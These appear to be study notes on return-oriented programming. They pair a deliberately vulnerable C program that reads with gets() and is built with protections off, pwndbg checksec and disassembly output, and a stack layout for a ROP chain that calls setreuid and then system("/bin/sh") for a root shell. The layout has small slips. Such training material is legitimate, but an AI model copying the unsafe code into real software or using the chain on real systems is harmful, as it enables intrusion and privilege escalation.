# ROP
- https://tc.gts3.org/cs6265/tut/tut06-01-rop.html
- https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md#rop-gadgets
# Example
```c
// gcc -m32 -fno-stack-protector -D_FORTIFY_SOURCE=0 -z execstack -no-pie -o chall chall.c
#include <stdio.h>
void buf()
{
    char buffer[128];
    gets(buffer);
}
int main()
{
    buf();
    return 0;
}
```
## Solution
```bash
pwndbg> checksec
File:     /mnt/e/work/ctf/Udemy/Exploit_Development_Tutorial_for_Hackers_and_Pentesters/sec5/chall
Arch:     i386
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX unknown - GNU_STACK missing
PIE:      No PIE (0x8048000)
Stack:    Executable
RWX:      Has RWX segments
pwndbg> disassemble buf
Dump of assembler code for function buf:
   0x08049176 <+0>:     push   ebp
   0x08049177 <+1>:     mov    ebp,esp
   0x08049179 <+3>:     push   ebx
   0x0804917a <+4>:     sub    esp,0x84
   0x08049180 <+10>:    call   0x80491c0 <__x86.get_pc_thunk.ax>
   0x08049185 <+15>:    add    eax,0x2e7b
   0x0804918a <+20>:    sub    esp,0xc
   0x0804918d <+23>:    lea    edx,[ebp-0x88]
   0x08049193 <+29>:    push   edx
   0x08049194 <+30>:    mov    ebx,eax
   0x08049196 <+32>:    call   0x8049050 <gets@plt>
   0x0804919b <+37>:    add    esp,0x10
   0x0804919e <+40>:    nop
   0x0804919f <+41>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x080491a2 <+44>:    leave
   0x080491a3 <+45>:    ret
End of assembler dump.
pwndbg>
```
## Stack
```
-88 buf
...............
-00 saved ebp
+04 setreuid // setuid(1001, 1001, 1001)
+08 pop*3;ret
+0c 1001
+10 1001
+14 1001
+18 system // system("/bin/sh")
+1c exit // exit(code)
+20 "bin/sh" 
```
